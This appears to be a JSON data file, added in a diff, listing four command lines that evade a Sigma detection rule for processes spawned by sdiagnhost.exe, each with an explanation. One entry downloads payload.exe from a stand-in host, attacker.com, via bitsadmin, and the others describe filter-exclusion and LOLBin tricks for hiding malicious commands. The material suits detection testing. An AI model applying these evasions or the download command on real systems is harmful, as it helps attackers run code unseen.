@@ -1,0 +1,18 @@
+[
+  {
+    "output": "cmd.exe /c bitsadmin /transfer test http://attacker.com/payload.exe C:\\Windows\\Temp\\payload.exe",
+    "explanation": "The child process is cmd.exe with 'bits' in the command line, matching filter_main_cmd_bits, which prevents the rule from triggering despite sdiagnhost.exe being the parent."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"Write-Host 'Simulated Payload'\" -noprofile",
+    "explanation": "This bypasses the rule by exploiting the 'filter_main_powershell_noprofile' exclusion. The Sigma rule explicitly ignores any powershell.exe child process if the command line ends with '-noprofile'. An adversary can append this benign flag to the end of a malicious payload to safely evade the detection."
+  },
+  {
+    "output": "wmic.exe process call create \"powershell.exe -c calc.exe\"",
+    "explanation": "This bypasses the rule by exploiting an incomplete LOLBin blocklist. The rule's 'selection' logic relies on matching specific child process names (powershell.exe, cmd.exe, mshta.exe, etc.). By having sdiagnhost.exe call an unlisted execution proxy like wmic.exe, forfiles.exe, or certutil.exe, the initial condition is never met."
+  },
+  {
+    "output": "cmd.exe /c \"echo harmless\" bits",
+    "explanation": "This bypasses the rule by abusing the 'filter_main_cmd_bits' condition. The rule ignores cmd.exe executions if the command line simply contains the string 'bits'. Including 'bits' anywhere in a malicious command line (e.g., as a dummy variable or trailing comment) will successfully filter out the alert."
+  }
+]
